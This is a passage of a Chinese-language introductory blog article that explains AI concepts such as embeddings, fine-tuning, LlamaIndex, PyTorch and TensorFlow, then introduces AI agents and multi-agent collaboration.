<li><strong>语义信息：</strong>  在这个向量空间中，语义相近的词语（如“国王”和“皇后”）或句子，其向量在空间中的位置也更接近。</li>
<li><strong>可计算性：</strong>  计算机可以通过计算向量之间的距离或余弦相似度，来判断两段内容的相似性。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-6">1.6 Fine-tuning（微调）</h3>
<p><strong>是在预训练模型的基础上，使用特定领域的数据进行额外训练，使其专门化以适应新任务的过程</strong></p>
<p>比喻：老师（开发者）针对学生的特长（模型的潜力），用专门的练习题（领域数据）进行辅导，强化他在特定科目上的能力</p>
<h3 data-id="heading-7">1.7 LlamaIndex</h3>
<p><strong>一个专为大语言模型（LLM）应用程序设计的数据框架，它能高效地将私有或特定领域的数据与LLM结合起来</strong></p>
<p>这个框架的核心作用是解决LLM在处理外部私有数据时遇到的困难。
它通过一套工具，帮助你轻松地从各种数据源（如PDF、数据库、API）摄取数据，并构建成易于查询的索引结构（例如向量索引）。通俗地说，你可以将它视为连接<strong>你的数据</strong>和<strong>大语言模型</strong>之间的一个“智能桥梁”</p>
<h3 data-id="heading-8">1.8 PyTorch</h3>
<p><strong>PyTorch是一个基于Python的开源深度学习框架，以其动态计算图和直观易用性而闻名。</strong></p>
<p>为了让您更好地理解，这里有几个关键解读：</p>
<ul>
<li><strong>核心特点：</strong>  它提供了强大的GPU加速张量计算功能，并且由于其 <strong><code>动态图</code>（Define-by-Run）</strong> 的特性，使得研究和调试模型变得更加灵活和直观。</li>
<li><strong>主要应用：</strong>  它是目前学术界和工业界最受欢迎的框架之一，广泛用于从研究原型设计到生产部署的整个机器学习生命周期。</li>
<li><strong>简单类比：</strong>  您可以把它想象成深度学习的“Numpy”，但提供了自动求导和导和强大的GPU支持，使得构建和训练复杂的神经网络变得非常简单。</li>
</ul>
<h3 data-id="heading-9">1.9 TensorFlow</h3>
<p><strong>TensorFlow是一个由Google开发的端到端开源机器学习平台，以其强大且成熟的生产级部署能力著称。</strong></p>
<p>为了帮助您更好地理解，这里是几点关键解读：</p>
<ul>
<li><strong>核心定位：</strong>  它是一个覆盖从<strong>研究建模</strong>到<strong>产业部署</strong>全流程的完整生态系统，而不仅仅是一个库。</li>
<li><strong>历史特点：</strong>  早期以其独特的<strong>静态计算图</strong>闻名，虽然现在也支持了动态图（Eager Execution），但其在分布式训练和大规模服务方面的稳定性和性能是其传统优势。</li>
<li><strong>组成部分：</strong>  除了核心的深度学习框架，还包含了用于移动设备和边缘计算的TensorFlow Lite、用于浏览器环境的TensorFlow.js等一系列工具。</li>
</ul>
<h2 data-id="heading-10">2. 关于AI Agent</h2>
<h3 data-id="heading-11">2.1 AI Agent介绍</h3>
<p>AI Agent 是指人工智能代理（Artificial Intelligence Agent）是一种能够感知环境进行自主理解，进行
决策和执行动作的智能体。AI Agent具备通过独立思考、调用工具逐步完成给定目标的能力。</p>
<p>一个基于大模型的AI Agent系统可以拆分 LLM（大模型）、记忆（Memory）、任务规划（Planning）
以及工具使用（Tool） 的集合。在LLM为基础的AI Agent系统中，大模型为AI Agent系统的大脑负责
计算，并需要其他组件进行辅助。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a4d848b4e0bb4dd8bd90118df002c8d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKz55WU55qE6aOO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765473250&amp;x-signature=6YkupScc1S4VF1TeE3FI8JmsgFg%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-12">2.2 多个agen协作</h3>
<p>多Agent模型（Multi-Agent Model）是一种分布式人工智能模型，由多个智能体（Agent）组成，每
个Agent都具有自主决策和交互能力，能够相互协作、竞争或协商以完成共同或各自的任务。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ec16a19664d40c6b7c96e1c4ef4804b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKz55WU55qE6aOO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765473250&amp;x-signature=uo32LvtuAO71ccD3LyqFMBLmIYY%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>